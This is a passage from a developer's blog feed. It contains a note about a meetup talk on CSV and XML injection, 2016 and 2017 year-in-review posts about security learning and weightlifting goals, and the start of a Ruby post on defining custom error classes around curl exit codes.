programming, and failover conditions. It was a great discussion and I now know that this person is a capable software developer. Their resume went to the top of the pile.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSV & XML Injections - YYCRuby Presentation]]></title>
    <link href="http://gavinmiller.io/2018/injection-security-presentation/">
    <updated>2018-03-22T12:57:00-06:00</updated>
    <id>http://gavinmiller.io/2018/injection-security-presentation</id>
    <content type="html"><![CDATA[<p>This month I had the wonderful opportunity to speak again in front of the YYCRuby meetup group in calgary. The presentation covered CSV and XML injection attacks, and for me the highlight was popping a shell on a windows vm using CSV injection. <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/hurtrealbad.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="hurtrealbad">
              hurtrealbad
              </span>
            </span>
          </p>

<p>You can view the slides below:</p>

<script async class="speakerdeck-embed" data-id="3958d6b67d6448dba439e7612bc81218" data-ratio="1.33333333333333" src="http://gavinmiller.io//speakerdeck.com/assets/embed.js"></script>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2017 Year In Review]]></title>
    <link href="http://gavinmiller.io/2017/2017-year-in-review/">
    <updated>2017-12-30T10:34:00-07:00</updated>
    <id>http://gavinmiller.io/2017/2017-year-in-review</id>
    <content type="html"><![CDATA[<p>Hello! This is the second installment of my year in review &ldquo;series&rdquo;. <a href="http://gavinmiller.io/2017/2016-year-in-review/">Last year</a>
I did a year in review and found it to be very beneficial and so the tradition continues.</p>

<h1>Blog / Community</h1>

<p>My goals for 2017 centered around a few items: finishing an ebook info product, writing on the blog, and
mentoring with Chic Geek.</p>

<p>The idea for the ebook was to create something based on my experience in Ruby &amp; Security.
This did not happen. I started working on the project and came to the realization that I
didn&rsquo;t want to do an info product. My heart wasn&rsquo;t there and I killed the goal!</p>

<p>The second bit of work that I wanted to accomplish was writing more for the blog. This also did not happen.
Primarily there was no info product to write for and therefore not a lot of
motivation to dig up new material for blogging. As well, very little major Ruby related work landed on my
plate at work so there were minimal new ideas / material to write about.</p>

<p>Both of the above can feel like failures if I let them. But upon reflection I realize they weren&rsquo;t things
I wanted to do. And I&rsquo;m okay with not doing something for the sake of meeting a goal. There is a quote from
the book <a href="https://www.mentalmanagementstore.com/product/with-winning-in-mind/">With Winning in Mind</a> that
applies to this situation:</p>

<blockquote><p>if you trade up to a new goal in the process of working toward a goal, the first goal has completed its
purpose!</p></blockquote>

<p>In this case, I killed two goals that allowed me to pickup a new goal (more on that later). To me that is a
success.</p>

<p>My final goal from last year was to mentor with <a href="https://www.thechicgeek.ca/">Chic Geek</a>. I had a fantastic
mentee this year. My mentee made it her goal to get a job as a software dev. We worked on researching
companies, polishing her resume, practicing for interviews,
and working on a portfolio project. It was a very rewarding experience for both of us
and my mentee hit her goal and landed a job in town. I was very proud of how hard my mentee worked and
that she was able to accomplish her goal.</p>

<h3>Goals</h3>

<p>For this next year I&rsquo;ve changed the community and blog related goals to be a little more focused on side
projects:</p>

<ul>
<li>Prototype App &ndash; A friend of mine has asked me to help him build a prototype Augmented Reality app to use
for grant hunting. I like his idea and think I can spin him something quickly.</li>
<li>Launch a SaaS &ndash; I&rsquo;ve got an idea that is approximately 40% implemented that I started last year. I&rsquo;ve done
a proof of concept and want to productize this app. I&rsquo;ll write further about it as this
materializes more.</li>
<li>Present at the ruby meetup group on security &ndash; I&rsquo;ve got a few ideas lined up that should fall into place.</li>
<li>A blog post or two &ndash; One would be on the security ideas I have in mind, the other on some of
the things I&rsquo;ve learned at work in the last few weeks of 2017. We&rsquo;ll see what the rest of the year holds.</li>
</ul>


<h1>Work / Security</h1>

<p>Last year I had focused my work / security goals towards learning more about reverse engineering. There are
two coleagues at work that I talk to about this topic and I enjoy every minute of it. As part of my
goals last year, I decided to take a course on reverse engineering. I was lucky enough that these two
colleagues were writing a course for SAIT on Malware Analysis and I was able to beta test it for them. It
was a rare opportunity and I learned a lot from the course.</p>

<p>By taking the malware reversal course, I learned that I enjoy reading and discussing the topic of malware,
but don&rsquo;t enjoy the act of reversing malware as much. Which means that I was able to
kill my goal of doing a full CTF.</p>

<p>I also learned during the year that I am more interested in web based security. I had the
opportunity to attend an internal Cisco training course called <code>r00tcamp</code>. In the course,
I was able to explore different types of web exploits &ndash; some I was familiar with, others I wasn&rsquo;t &ndash; and also
work on a web based CTF. As part of r00tcamp I was given time to
find exploits in our product. I found a handful of security bugs (some major, some minor)
 which was a big win. And I now know that web based security is what I enjoy the most!</p>

<p>I had made the goal to complete a responsible disclosure last year and I am happy to report that I was
successful doing this <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f604.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="smile">
              smile
              </span>
            </span>
           I submitted a security bug report
through <a href="https://www.hackerone.com/">Hacker One</a>, but unfortunately I didn&rsquo;t get a bounty for it <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f61e.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="disappointed">
              disappointed
              </span>
            </span>
          
At least I can check off that I accomplished my goal in this area. <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/2705.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="white_check_mark">
              white_check_mark
              </span>
            </span>
          </p>

<p>One additional piece of training that I was also able to take advantage of this year was <code>CCENT</code>. One of my
co-workers teaches a CCENT course locally, and offered the training up to the Calgary office.
By crossing out my info product &amp; blogging related goals, I was able to make the time to go
through the course. I learned a great deal about networking and feel like I have a solid grasp on
networking fundamentals.</p>

<h3>Goals</h3>

<p>My goals for this year are focused around bug bounties &amp; web security testing:</p>

<ul>
<li>Achieve work goals related to pentesting &ndash; I&rsquo;ve setup a reading material and security training plan
at work and finishing even half of that would be a huge win.</li>
<li>Complete the <a href="https://google-gruyere.appspot.com/#0__hackers">Gruyere &ldquo;CTF&rdquo;</a> &ndash; this will be good practice
for doing real bug bounties.</li>
<li>Submit a bug and receive a bug bounty &ndash; Knowledge application!</li>
<li>Submit 5 bug bounties (stretch goal) &ndash; <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/allthethings.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="allthethings">
              allthethings
              </span>
            </span>
           Knowledge application!</li>
<li>Finish crypto-pals (stretch goal) &ndash; this isn&rsquo;t super high on the priority list, but getting more
exposure to how crypto works is beneficial, especially with the Internet taking an HTTPS everywhere direction.
There is going to be a lot of opportunity for exploiting incorrectly done crypto.</li>
</ul>


<h1>Weightlifting</h1>

<p>Weightlifting did not go as planned this year. Let&rsquo;s start with the numbers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>               | 2017 |  2017  |      |
</span><span class='line'>               | Goal | Actual | diff |
</span><span class='line'>--------------------------------------|
</span><span class='line'>Snatch         |  165 |  140   | -25  |
</span><span class='line'>Squat Clean    |  245 |  200   | -45  |
</span><span class='line'>Split Jerk     |  200 |  195   | -5   |
</span><span class='line'>Clean & Jerk   |  200 |  195   | -5   |
</span><span class='line'>Front Squat    |  265 |  215   | -50  |
</span><span class='line'>Back Squat     |  315 |  240   | -75  |
</span><span class='line'>Push Press     |  165 |  175   | +10  |
</span><span class='line'>Strict Press   |  135 |  135   |  0   |
</span><span class='line'>Bench          |  225 |  185   | -40  |
</span><span class='line'>Deadlift       |  400 |  340   | -60  |
</span><span class='line'>Overhead Squat |  185 |  165   | -20  |
</span><span class='line'>BS + DL + BP   |  940 |  765   | -175 |</span></code></pre></td></tr></table></div></figure>


<p>My presses &amp; jerk went according to plan and I&rsquo;m jerking above bodyweight <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/success.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="success">
              success
              </span>
            </span>
          
However my squats, deadlift, and olympic lifts did not. In fact, many of these numbers did not change
from 2017. This happened for a number of reasons:</p>

<ol>
<li>Family</li>
<li>Training Plan</li>
<li>Injury</li>
</ol>


<p>Let&rsquo;s start with the family reason. This little guy decided to enter the Miller family:</p>

<p><img src="http://gavinmiller.io/images/2017-review/maxwell.jpg" alt="Max Miller" /></p>

<p>My son Maxwell was born in June and he is an absolute joy (he&rsquo;s the one on the right.)
Anyone with a newborn will tell you one of the
first things to go is sleep. And if you&rsquo;ve done any weightlifting, you know that sleep is a must.
This large change affected my training and weightlifting (no surprise there, or disappointment, our
kiddo is amazing!)</p>

<p>The second reason that my weightlifting didn&rsquo;t go as planned was that my training plan didn&rsquo;t align with my goals.
I had wanted to do a few weightlifting cycles like last year, but they never happened. I got
distracted by the CrossFit Open, then distracted again with some other &ldquo;nice to have&rdquo; goals. All of a sudden
it was December and I realized I had done nothing to hit my numbers. Oops!</p>

<p>I&rsquo;ve already made changes to my programming to better align myself with my training goals, and have changed
my focus away from CrossFit to exclusively weight training. I&rsquo;m confident that this alone will help to
hit my numbers this year.</p>

<p>The final reason for not hitting my numbers was injury. Around the time Maxwell was born I started to
have pain in my left hip, especially when squatting. After a bit of diagnosing it turns out that
bad mechanics were to blame. My hip flexors &amp; quads were so tight they were having an affect on my hip socket
and in turn causing pain in hip based movements (which is the majority of movements.) <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f4a5.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="collision">
              collision
              </span>
            </span>
          </p>

<p>It has taken me around 2 months to be pain free in my hip, and has been another month of rehab to fix my squat
mechanics. There is still a long way to go and my squat is nowhere near fixed yet. I&rsquo;ve only begun
squatting with load this month and at a faction of what I&rsquo;m capable of. Injury sucks and it is going
to impact my goals for 2018.</p>

<h3>Goals</h3>

<p>This year I&rsquo;ve set reasonable expectations for my goals, and a big stretch goal in the event that
everything goes exceptionally well. My primary goal is fixing my squat. Without that working, everything
else doesn&rsquo;t matter.</p>

<p>If my squat is on track, my next set of goals revolve around hitting a 50 percentile against <a href="http://beyondthewhiteboard.com/">Beyond the
Whiteboard</a>. I use BTWB to track my lifts and it represents roughly what the
CrossFit population is capable of. I&rsquo;ve been <code>&gt; 50</code> for everything but powerlifts &amp; olympic lifts for awhile
and this has been the catalyst to lift seriously. Translated into weights that
looks like:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>               |         | 2018 |      |
</span><span class='line'>               | Current | Goal | Diff |
</span><span class='line'>---------------------------------------|
</span><span class='line'>Snatch         |   140   |  145 | +5   |
</span><span class='line'>Squat Clean    |   200   |  205 | +5   |
</span><span class='line'>Split Jerk     |   195   |  200 | +5   |
</span><span class='line'>Clean & Jerk   |   195   |  200 | +5   |
</span><span class='line'>Back Squat     |   240   |  285 | +45  |
</span><span class='line'>Strict Press   |   135   |  145 | +10  |
</span><span class='line'>Bench          |   185   |  225 | +40  |
</span><span class='line'>Deadlift       |   340   |  355 | +15  |
</span><span class='line'>BS + DL + BP   |   765   |  865 | +100 |</span></code></pre></td></tr></table></div></figure>


<p>These numbers are less ambitious than last years numbers.</p>

<p>To that end, I&rsquo;ve setup a second goal
if I hit the above numbers before the end of the year. That goal is to align my ratios against an
&ldquo;ideal athlete&rdquo;. This is the idea that using the backsquat as a base measure, different lifts should be a
certain percentage of the backsquat. I&rsquo;d need to hit the following numbers to meet that goal:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>               |         | 2018 |      |
</span><span class='line'>               | Current | Goal | Diff |
</span><span class='line'>---------------------------------------|
</span><span class='line'>Snatch         |  140    |  190 | +50  |
</span><span class='line'>Squat Clean    |  200    |  235 | +35  |
</span><span class='line'>Split Jerk     |  195    |  240 | +45  |
</span><span class='line'>Clean & Jerk   |  195    |  230 | +35  |
</span><span class='line'>Push Press     |  175    |  185 | +10  |
</span><span class='line'>Front Squat    |  215    |  245 | +30  |</span></code></pre></td></tr></table></div></figure>


<p>Some of these numbers are pretty crazy given where I am now. And being able to add 45# to a split jerk, or
50# to my snatch in a year would be amazing.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[2016 Year In Review]]></title>
    <link href="http://gavinmiller.io/2017/2016-year-in-review/">
    <updated>2017-01-18T21:09:00-07:00</updated>
    <id>http://gavinmiller.io/2017/2016-year-in-review</id>
    <content type="html"><![CDATA[<p>Hi &ndash; I&rsquo;m Gavin Miller and you&rsquo;ve landed on the 2016 year in review. This is the first year that I&rsquo;ve decided to
write a retrospective style blog post. At the end of 2016 my boss asked me to do one for work and I
was astounded to see the things I had accomplished, and the progress that our team had made for the
year. To that end, I&rsquo;m hoping to gain the same perspective on other areas in my life.</p>

<h1>Blog / Community</h1>

<p>This is the section that&rsquo;s probably most relevant to readers of this blog. 2016 was a bit less than equal
to 2015 for blogging material. In total I wrote 3 blog posts on the topic of ruby/rails security. I find these
posts take approximately 10-15 hours of time to do, due to the research, verification, and testing of the
posts.</p>

<p>One of the best posts I wrote this year was <a href="http://gavinmiller.io/2016/a-tale-of-security-gone-wrong">A Tale of Security Gone Wrong</a>.
It received more Internet points than other things I have written. It was a fun post to write and materialized from the
presentations I gave for the local <a href="http://gavinmiller.io/2016/ruby-rails-security-presentation/">yycruby</a> &amp;
<a href="http://gavinmiller.io/2016/security-for-js-devs-presentation/">yycjs</a> groups.</p>

<p>The second big writing accomplishment for the year was releasing the
<a href="https://www.getdrip.com/forms/88066895/submissions/new">Improve Rails Security in 5 Days</a> email course. I wrote
this when I switched from MailChimp for email newsletters to Drip. The purpose of this was to have a
solid platform to launch an ebook from &mdash; more on that to come.</p>

<p>As I mentioned, I spent the beginning of the year doing a series of security presentations at local meetup groups.
This was a lot of fun, and I can certainly see giving other presentations like this again in the future. It was
also a real eye-opener. I don&rsquo;t consider myself to be <em>that</em> knowledgeable when it comes to security (hello imposter
syndrome), but these presentations highlighted how cursory many developer&rsquo;s security knowledge is. I believe
there&rsquo;s many valuable resources that can be written for the intersection of &ldquo;Secure Programming&rdquo; and &ldquo;Language X&rdquo;.</p>

<p>To that end, I&rsquo;ve begun to write one of those resources. I&rsquo;ll keep details pretty sparse for now. This has been
an idea on the back burner for some time. I had a bit of momentum on the project at the beginning of 2016, but
then summer came and I completely checked out from wanting to do anything on the computer.</p>

<p>My final community accomplishment for 2016 was being a mentor for <a href="http://www.thechicgeek.ca/">Chic Geek</a>. I am
a big fan of Chic Geek and Kylie who runs the organization. They are doing amazing things in Calgary
to promote technology as a viable field for women. My mentee was able to work through some difficult problems
over the course of our mentorship, and I grew as a mentor.</p>

<h3>Goals</h3>

<p>For 2017 I have set the following goals:</p>

<ul>
<li>Finish ebook &ndash; this is a matter of putting one foot in front of the other and doing the hard work. I&rsquo;ve already
got a solid topical foundation and a rough sketch of what the book will be. Now I just have to execute on that!</li>
<li>4 substantial blog posts &ndash; These spill out naturally when I hit interesting topics in my day job.</li>
<li>Mentor with Chic Geek &ndash; I had such a great time doing this last year that I want to make sure it happens again
this year!</li>
</ul>


<h1>Work</h1>

<p>2016 was an exciting year for me at Cisco. One I enjoyed tremendously. I&rsquo;ve often thought that anyone can
become productive in a system very quickly if they&rsquo;re a good programmer. However, <strong>I&rsquo;ve come to recognize that
context takes a long time to build and depending on the nature of the role that is vastly more important to
getting things done than sheer effort / skill / ability.</strong></p>

<p>It was around the beginning of the year I actually started to get my footing in my role with enough context
to have an impact on my team&rsquo;s work. It was during this time that I began to refactor the build system
for our project and move it onto GoCD. We were hitting occasional errors with builds and they were deeply
dependent on institutional knowledge (details in only a few people&rsquo;s heads) that wasn&rsquo;t codified. Turn around
was about a month on this project to start seeing tangible results in the build system. Eventually our
team moved from a once every few days build model to daily builds. It has allow QA to build a regression
testing suite into our builds which has saved everyone time and effort. Three cheers for CI/CD pipelines!</p>

<p>I was lucky enough to wiggle into my role at Cisco with limited Linux knowledge. This means that I&rsquo;ve had to
learn the linux domain on the fly, which has been painful at times, because you don&rsquo;t know what you don&rsquo;t know.
Throughout this year I&rsquo;ve ended up using a ton of utilities to analyze, diagnose, and fix bugs in our codebase.
Just a few of the tools/systems that I&rsquo;ve learned: <code>grub</code>, <code>lvm</code>, <code>dd</code>, <code>rpm</code>, <code>yum</code>, <code>ldd</code>. In addition to
this I&rsquo;ve also learned a ton about compiling programs from source, and how linking and pathing works for many
open source software products. At the beginning of the year, I would have struggled to compile something like
<code>Ruby</code>, <code>Python</code>, <code>Erlang</code>, or <code>Perl</code> from source. I&rsquo;ve now compiled, recompiled, and configured all of those
packages multiple times.</p>

<p>One of the other benefits of being at Cisco is being exposed to a boat-ton of smart people. And
these people are in vastly different roles than mine. Part of that intersection came when Cisco held an internal
CTF competition this year. I picked the lowest point value (easiest) reverse engineering task and made it my
mission to solve it. I used stack diagrams, <code>gdb</code>, <code>hopper</code>, <code>ida pro</code>, and other tools all in the effort to find
a flag. And <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/success.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="success">
              success
              </span>
            </span>
           <a href="https://twitter.com/gavingmiller/status/795676516248068096">I found the flag</a>!</p>

<h3>Goals</h3>

<ul>
<li>Blog about non-ruby topics &ndash; I&rsquo;ve accrued a fair amount of knowledge outside of Ruby as it relates to the tools
I use daily. I&rsquo;d like to write at least two blog posts on this experience. Namely: GoCD, and compiling from source.</li>
<li>Take a course/training on Reverse Engineering &ndash; I enjoyed disassembling code, and using the many tools
to interact with source in the CTF competition. I&rsquo;d like to build those skills more!</li>
<li>Complete a full CTF &ndash; To dovetail / compliment learning about RE, I&rsquo;d like to apply those skills in a CTF. There
are a few archived CTF&rsquo;s that I&rsquo;ve saved that I&rsquo;ll take the time to go through and solve.</li>
<li>Complete a responsible disclosure &ndash; This one is a stretch goal. It&rsquo;s one thing to write about protecting
ruby, and it&rsquo;s a total other thing to actually exploit a live system. <a href="https://hackerone.com">Hacker One has an easy and ethical platform</a>
to do this from and I&rsquo;d like to try my hand at it.</li>
</ul>


<h1>Weightlifting</h1>

<p>Towards the middle of this year &mdash; June &mdash; I began to dial in and focus on my weightlifting.
I&rsquo;ve been doing CrossFit for the last 5 or so years, and I was getting frustrated that I wasn&rsquo;t seeing enough
progression on my olympic lifts. I talked to my coach at <a href="http://crossfitmost.com/">Most</a>, and she suggested
I do a strength cycle, and focus on nutrition. So we did.</p>

<p>I started with a simple program of eating at calorie surplus and tracking macros: Carbs, Fat, and Protein.
This was the first time I had ever done a bulk, otherwise I had mostly kept to &ldquo;eating healthy.&rdquo; <strong>The
thing is, if you don&rsquo;t keep track of what you&rsquo;re eating, it&rsquo;s hard to tell wether you&rsquo;re healthy or not.</strong>
It became immediately apparent that I wasn&rsquo;t regularly eating enough to build muscle. The program quickly fixed that!
Over the course of 7 months I went from 160lbs to 190lbs &mdash; a 30lbs gain. It was very gradual as can be seen
from the graph below:</p>

<p><img src="http://gavinmiller.io/images/2016-review/bulking.png" alt="20lbs weight gain over 6 months" /></p>

<p>As part of my eating, I did two strength cycles. The first one was a month long, and the second one lasted
two months. The majority of the strength cycles focused on legs: Deadlift, Front Squat, Back Squat, etc. With
some occasional upper body work. And it was also all tempo work. If you&rsquo;re not familiar with tempo lifts it&rsquo;s
where you slow down the eccentric or concentric portion of a movement (I think typically during
eccentric, and then driving strongly during concentric for power generation is the typical tempo setup.)</p>

<p>In that period of time I saw a huge increase in my squats and deadlift. While I saw improvements in clean &amp; jerk
and snatch, they weren&rsquo;t as high as I had hoped. Towards the end of 2016 it felt like I was on the cusp of hitting
a breakthrough on technique for both of these lifts. Overall between the end of
2015 to the end of 2016 my numbers looked like this:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Year end #s    | 2015 | 2016 |
</span><span class='line'>------------------------------
</span><span class='line'>Snatch         |  115 |  135 |
</span><span class='line'>Squat Clean    |  156 |  200 |
</span><span class='line'>Split Jerk     |  165 |  175 |
</span><span class='line'>Clean & Jerk   |  165 |  175 |
</span><span class='line'>Front Squat    |  177 |  215 |
</span><span class='line'>Back Squat     |  215 |  240 |
</span><span class='line'>Push Press     |  125 |  145 |
</span><span class='line'>Strict Press   |  105 |  115 |
</span><span class='line'>Bench Press    |  153 |  175 |
</span><span class='line'>Deadlift       |  285 |  340 |
</span><span class='line'>Overhead Squat |  119 |  150 |
</span><span class='line'>BS + DL + BP   |  644 |  755 |</span></code></pre></td></tr></table></div></figure>


<p>Additionally as part of my strength cycle I participated in a mini-powerlifting competition at
my gym. It was a great time and I put up my max squat, deadlift, and bench press numbers for 2016.
Here&rsquo;s a picture of the 340lbs deadlift:</p>

<p><img src="http://gavinmiller.io/images/2016-review/powerlifting-comp.jpg" alt="Gavin Miller Deadlifting 340lbs" /></p>

<h3>Goals</h3>

<p>For 2017 I&rsquo;ve set the following goals for myself:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>               | 2015 | 2016 | 2017 | diff |
</span><span class='line'>-------------------------------------------|
</span><span class='line'>Snatch         |  115 |  135 |  165 |  +30 |
</span><span class='line'>Squat Clean    |  156 |  200 |  245 |  +45 |
</span><span class='line'>Split Jerk     |  165 |  175 |  200 |  +25 |
</span><span class='line'>Clean & Jerk   |  165 |  175 |  200 |  +25 |
</span><span class='line'>Front Squat    |  177 |  215 |  265 |  +50 |
</span><span class='line'>Back Squat     |  215 |  240 |  315 |  +75 |
</span><span class='line'>Push Press     |  125 |  145 |  165 |  +20 |
</span><span class='line'>Strict Press   |  105 |  115 |  135 |  +20 |
</span><span class='line'>Bench          |  153 |  175 |  225 |  +50 |
</span><span class='line'>Deadlift       |  285 |  340 |  400 |  +60 |
</span><span class='line'>Overhead Squat |  119 |  150 |  185 |  +35 |
</span><span class='line'>BS + DL + BP   |  644 |  755 |  940 | +175 |</span></code></pre></td></tr></table></div></figure>


<p>My pressing goals are approximately a 20lbs increase. My bench is much lower than it should be and I feel
like a few pressing cycles can see a 50lbs increase. I&rsquo;d also like to do two more leg cycles which I feel would
bring increases in front squat, back squat, and deadlift. And finally the olympic lifts benefit from increases
in upper body, and lower body strength cycles so hopefully those lifts increase as well!</p>

<p>For bodyweight I&rsquo;d like to maintain between 180lbs &ndash; 190lbs of lean body mass. I&rsquo;m not sure if I&rsquo;m ready for
more than that &hellip; yet <span class="outer-emoji">
              <span
              style="background: url('/images/emoji/unicode/1f609.png') no-repeat top left; background-size: 100%"
              class="inner-emoji"
              title="wink">
              wink
              </span>
            </span>
          </p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Shorthand Syntax for Defining Errors in Ruby]]></title>
    <link href="http://gavinmiller.io/2017/ruby-error-shorthand/">
    <updated>2017-01-16T17:16:00-07:00</updated>
    <id>http://gavinmiller.io/2017/ruby-error-shorthand</id>
    <content type="html"><![CDATA[<p>A common practice that I use in Ruby is defining custom error classes for my own code. There&rsquo;s no great
reason to do it (that I&rsquo;ve heard) other than providing a more expressive error message than the standard
error/exception classes.</p>

<p>Here&rsquo;s a contrived example:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;open3&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Curl</span>
</span><span class='line'>  <span class="c1"># From: https://curl.haxx.se/libcurl/c/libcurl-errors.html</span>
</span><span class='line'>  <span class="no">CURLE_OK</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="no">CURLE_UNSUPPORTED_PROTOCOL</span> <span class="o">=</span> <span class="mi">1</span>
</span><span class='line'>  <span class="no">CURLE_FAILED_INIT</span> <span class="o">=</span> <span class="mi">2</span>
</span><span class='line'>  <span class="no">CURLE_URL_MALFORMAT</span> <span class="o">=</span> <span class="mi">3</span>
</span><span class='line'>  <span class="c1"># ... etc ...</span>
</span><span class='line'>
</span><span class='line'>  <span class="c1"># custom errors</span>
</span><span class='line'>  <span class="k">class</span> <span class="nc">CurlUnsupportedProtocolError</span> <span class="o">&lt;</span> <span class="no">StandardError</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">class</span> <span class="nc">CurlFailedInitError</span> <span class="o">&lt;</span> <span class="no">StandardError</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="k">class</span> <span class="nc">CurlURLMalformatError</span> <span class="o">&lt;</span> <span class="no">StandardError</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="c1"># ... etc ...</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
</span><span class='line'>    <span class="vi">@url</span> <span class="o">=</span> <span class="n">url</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">execute</span>
</span><span class='line'>    <span class="n">cmd</span> <span class="o">=</span> <span class="o">[</span><span class="s1">&#39;curl&#39;</span><span class="p">,</span> <span class="vi">@url</span><span class="o">]</span>
</span><span class='line'>    <span class="n">out</span><span class="p">,</span> <span class="n">err</span><span class="p">,</span> <span class="n">status</span> <span class="o">=</span> <span class="no">Open3</span><span class="o">.</span><span class="n">capture3</span><span class="p">(</span><span class="o">*</span><span class="n">cmd</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">case</span> <span class="n">status</span><span class="o">.</span><span class="n">exitstatus</span>
</span><span class='line'>    <span class="k">when</span> <span class="no">CURLE_OK</span>
</span><span class='line'>      <span class="c1"># Do work</span>
</span><span class='line'>    <span class="k">when</span> <span class="no">CURLE_UNSUPPORTED_PROTOCOL</span>
</span><span class='line'>      <span class="k">raise</span> <span class="no">CurlUnsupportedProtocolError</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;&lt;informative error message&gt;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">when</span> <span class="no">CURLE_FAILED_INIT</span>
</span><span class='line'>      <span class="k">raise</span> <span class="no">CurlFailedInitError</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;&lt;another informative error message&gt;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="k">when</span> <span class="no">CURLE_URL_MALFORMAT</span>
</span><span class='line'>      <span class="k">raise</span> <span class="no">CurlURLMalformatError</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="s1">&#39;&lt;many errors, such excite&gt;&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="c1"># ... etc ...</span>
</span><span class='line'>    <span class="k">end</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'><span class="k">end</span>
